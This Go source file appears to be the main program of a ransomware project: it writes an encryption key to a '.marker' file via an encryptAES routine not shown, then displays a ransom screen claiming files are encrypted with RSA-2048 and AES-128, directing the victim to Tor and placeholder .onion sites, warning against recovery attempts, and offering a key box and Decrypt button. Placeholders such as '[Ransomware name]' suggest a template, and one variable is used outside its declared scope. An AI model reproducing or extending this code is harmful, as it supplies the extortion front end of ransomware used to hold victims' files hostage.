package main

import (
	"fmt"
	"os"

	gui "github.com/gen2brain/raylib-go/raygui"
	rl "github.com/gen2brain/raylib-go/raylib"
	"golang.design/x/clipboard"
)

const (
	marker = ".marker"
)

func main() {
	var (
		akey                  []byte
		textBoxText           string = ""
		textBoxEditMode       bool   = false
		showSuccessMessageBox bool   = false
		showFailMessageBox    bool   = false
	)

	if _, err := os.Stat(marker); os.IsNotExist(err) {
		f, err := os.Create(marker)
		if err != nil {
			fmt.Println("Error creating marker:", err)
			return
		}
		akey, err = encryptAES()
		if err != nil {
			panic(err)
		}
		defer f.Close()
		f.WriteString(string(akey))
	} else {
		akey, err = os.ReadFile(marker)
		if err != nil {
			fmt.Println("error reading marker: ", err)
			return
		}
		fmt.Println("marker found:", string(akey))
	}

	rl.SetTraceLogLevel(rl.LogWarning)
	rl.InitWindow(750, 600, "IMPORTANT")

	rl.SetTargetFPS(60)

	for !rl.WindowShouldClose() {
		rl.BeginDrawing()
		rl.ClearBackground(rl.RayWhite)

		rl.DrawText("You Have Been a Victim of [Ransomware name]", 25, 25, 25, rl.DarkGray)
		rl.DrawText("your files are encrypted with RSA-2048 and AES-128 ciphers.", 25, 75, 20, rl.DarkGray)
		rl.DrawText("You can only decrypt your files with the specific key we have.", 25, 105, 20, rl.DarkGray)
		rl.DrawText("What to do:", 25, 155, 20, rl.DarkGray)
		rl.DrawText("1. Go to https://www.torproject.org/ and download the Tor Browser", 25, 185, 20, rl.DarkGray)
		rl.DrawText("2. Visit one of these pages:", 25, 215, 20, rl.DarkGray)
		rl.DrawText("[mirror1].onion", 50, 245, 20, rl.DarkGray)
		rl.DrawText("[mirror2].onion", 50, 275, 20, rl.DarkGray)
		rl.DrawText("WARNING!", 25, 325, 25, rl.DarkGray)
		rl.DrawText("1. Renaming, copying, deleting or moving any files could DAMAGE ", 25, 355, 20, rl.DarkGray)
		rl.DrawText("the cipher and decryption will be impossible.", 40, 385, 20, rl.DarkGray)
		rl.DrawText("2. Trying to recover with any software can also break the cipher", 25, 415, 20, rl.DarkGray)
		rl.DrawText("and file recovery will become a problem.", 40, 445, 20, rl.DarkGray)
		rl.DrawText("key: "+string(akey)[:13]+"...", 40, 485, 20, rl.DarkGray)

		if gui.Button(rl.Rectangle{X: 280, Y: 485, Width: 25, Height: 25}, gui.IconText(gui.ICON_FILE_COPY, "")) {
			clipboard.Write(clipboard.FmtText, akey)
		}

		gui.SetStyle(gui.DEFAULT, gui.TEXT_SIZE, 20)

		gui.SetStyle(gui.TEXTBOX, gui.TEXT_ALIGNMENT, int64(gui.TEXT_ALIGN_LEFT))
		if gui.TextBox(rl.Rectangle{X: 25, Y: 525, Width: 325, Height: 40}, &textBoxText, 64, textBoxEditMode) {
			textBoxEditMode = !textBoxEditMode
		}

		if textBoxEditMode && (rl.IsKeyDown(rl.KeyLeftControl) || rl.IsKeyDown(rl.KeyRightControl)) && rl.IsKeyPressed(rl.KeyV) {
			textBoxText += string(clipboard.Read(clipboard.FmtText))
		}

		gui.SetStyle(gui.BUTTON, gui.TEXT_ALIGNMENT, gui.TEXT_ALIGN_CENTER)
		if gui.Button(rl.Rectangle{X: 370, Y: 525, Width: 150, Height: 40}, gui.IconText(gui.ICON_KEY, "Decrypt")) {
			if err := decryptAES(textBoxText); err != nil {
				showFailMessageBox = true
			} else {
				showSuccessMessageBox = true
				os.Remove(marker)
			}
		}
		if showFailMessageBox {
			result := gui.MessageBox(rl.Rectangle{X: float32(rl.GetScreenWidth())/2 - 150, Y: float32(rl.GetScreenHeight())/2 - 60, Width: 300, Height: 120}, "Message", "Decryption failed", "OK")
			if result >= 0 {
				showFailMessageBox = false
			}
		} else if showSuccessMessageBox {
			result := gui.MessageBox(rl.Rectangle{X: float32(rl.GetScreenWidth())/2 - 150, Y: float32(rl.GetScreenHeight())/2 - 60, Width: 300, Height: 120}, "Message", "Decryption successful", "Close")
			if result >= 0 {
				rl.CloseWindow()
				os.Exit(0)
			}
		}

		rl.EndDrawing()
	}

	rl.CloseWindow()
}
